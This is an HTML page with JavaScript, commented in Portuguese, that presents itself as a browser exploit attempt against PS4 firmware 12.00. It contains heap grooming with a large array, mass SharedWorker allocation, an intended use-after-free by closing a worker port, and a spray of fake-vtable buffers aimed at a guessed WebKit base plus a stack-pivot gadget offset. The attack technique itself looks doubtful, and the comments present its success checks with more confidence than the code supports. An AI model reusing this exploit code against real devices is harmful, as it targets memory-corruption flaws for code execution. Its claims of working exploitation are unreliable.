<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - LAPSE STRATEGY</title>
    
</head>
<body>

    <h1>PS4 12.00 - LAPSE MEMORY ALLOCATOR</h1>
    <h3>Tática: Large Object Space Grooming + Worker UAF</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_lapse_style()">INICIAR ESTRATÉGIA LAPSE</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. TÉCNICA DO LAPSE (ESTABILIZAÇÃO DE HEAP)
        // =================================================================
        var stable_array = null;

        function prepare_lapse_heap() {
            log("Aplicando técnica Lapse (Large Object Space)...");
            
            // 1. Alocar Array Gigante (Segurando a memória baixa)
            try {
                stable_array = new Array(0x20000); // 128k elementos
                stable_array.fill(1.1); // Converte para Double Array (Fast Path)
                log("Stable Array alocado (Memória alinhada).");
            } catch(e) {
                log("Erro na alocação Lapse: " + e);
            }
        }

        // =================================================================
        // 2. O PAYLOAD (FAKE OBJECT)
        // =================================================================
        // Usaremos o Payload de Loop Infinito (EB FE) para testar RCE seguro.
        // Se congelar, vencemos.
        
        // Base WebKit "Chute" (A mais comum segundo estatísticas)
        var WK_BASE = 0x800000000n; 
        // Offset do Pivot que você extraiu
        var XCHG_RSP_RAX = 0x3F3E5F0n; 

        function build_payload() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);
            
            // Endereço absoluto do Pivot
            var pivot = WK_BASE + XCHG_RSP_RAX;

            // Encher o objeto com o endereço do Pivot (Fake Vtable)
            for(var i=0; i<buffer.byteLength; i+=8) {
                view.setBigUint64(i, pivot, true);
            }
            
            // Colocar "Loop Infinito" no início para garantir (EB FE)
            // Caso o kernel execute como código e não como ROP
            view.setUint16(0, 0xFEEB, true); 

            return buffer;
        }

        // =================================================================
        // 3. EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function run_lapse_style() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            // 1. Preparar o terreno (Estilo Lapse)
            prepare_lapse_heap();
            
            var payload = build_payload();
            log("Payload construído.");

            // 2. GROOMING (Workers nascem em cima do terreno estável)
            log("Alocando Workers no Heap Estável...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
            }

            // 3. TRIGGER (404)
            log("Pressão no Heap...");
            var p_count = 0;
            var it = setInterval(() => {
                if(p_count >= 4) {
                    clearInterval(it);
                    trigger_uaf(payload);
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers_stash.push(w);
                p_count++;
                log(`Worker ${401+p_count} alocado.`);
            }, 150);
        }

        function trigger_uaf(payload) {
            log("!!! DISPARANDO UAF !!!", "warn");
            
            // 1. Vítima
            var victim = workers_stash.pop();
            // Guardamos a referência da porta para verificar depois
            var probe_port = victim.port;

            // 2. FREE
            victim.port.close();
            victim = null;

            // 3. SPRAY MASSIVO (Tenta preencher o buraco)
            // Aumentamos a quantidade pois o "Stable Array" pode ter empurrado
            // os workers para uma área de memória mais alta.
            log("Spray Lapse-Style...");
            var spray = [];
            for(var k=0; k<10000; k++) {
                spray.push(new Uint32Array(payload));
            }

            // 4. VERIFICAÇÃO (LEAK CHECK)
            // Se o spray funcionou, a porta deve ter mudado de comportamento.
            // Se ainda for [object MessagePort], falhamos no reclaim.
            
            try {
                log("Sondando objeto morto...");
                // Tenta imprimir o objeto. Se for 'AAAA', sucesso.
                // Se for MessagePort, falha.
                var check = probe_port.toString();
                log("Resultado da leitura: " + check);
                
                if (check.indexOf("MessagePort") === -1) {
                    log("!!! SUCESSO: OBJETO CORROMPIDO !!!", "success");
                    alert("Objeto corrompido! Leak obtido.");
                } else {
                    log("Falha: Objeto ainda é MessagePort (Reclaim falhou).");
                    // Tenta forçar uso mesmo assim
                    probe_port.postMessage("DIE");
                }
            } catch(e) {
                log("Erro na leitura (Pode ser bom): " + e);
            }
        }
    </script>
</body>
</html>
